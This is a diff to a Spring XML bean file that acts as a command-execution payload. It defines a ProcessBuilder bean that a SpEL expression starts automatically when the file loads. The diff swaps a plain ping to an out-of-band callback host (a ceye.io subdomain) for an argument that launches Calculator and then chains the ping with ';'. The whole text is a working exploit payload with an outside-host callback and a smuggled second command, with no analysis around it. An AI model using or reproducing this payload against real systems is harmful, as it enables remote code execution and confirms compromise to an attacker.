@@ -5,8 +5,7 @@
      http://www.springframework.org/schema/beans/spring-beans.xsd
 ">
   <bean id="pb" class="java.lang.ProcessBuilder">
-     <constructor-arg value="ping"  />
-     <constructor-arg value="06pec0.ceye.io"  />
+     <constructor-arg value="/Applications/Calculator.app/Contents/MacOS/Calculator;ping 06pec0.ceye.io"  />
      <property name="whatever" value="#{ pb.start() }"/>
   </bean>
 </beans>
